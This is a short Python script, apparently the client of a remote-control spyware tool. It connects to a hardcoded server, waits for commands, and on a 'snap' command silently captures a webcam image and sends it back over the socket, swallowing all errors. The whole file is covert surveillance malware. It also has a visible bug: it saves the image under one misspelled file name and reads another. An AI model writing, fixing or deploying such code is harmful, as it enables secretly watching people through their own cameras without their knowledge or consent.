import socket 
import cv2

HOST = '192.168.43.85'
PORT = 8080

def snap_and_send(s):
    try:
        webcam = cv2.VideoCapture(1)
        check, frame = webcam.read()
        cv2.imwrite(filename="webca,.jpg", img=frame)
        webcam.release()
        
        #Send the image file data back to the server
        with open('webcam.jpg','rb') as f:
            data = f.read()
            s.sendall(data)
            
    except:
        pass
    
def connecting():
    s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST,PORT))
    
    while True:
        command = s.recv(1024)
        
        if 'terminate' in command.decode():
            s.close()
            break
        elif 'snap' in command.decode():
            try:
                snap_and_send(s)
            except:
                pass
def main():
    connecting()
if __name__ == '__main__':
    main()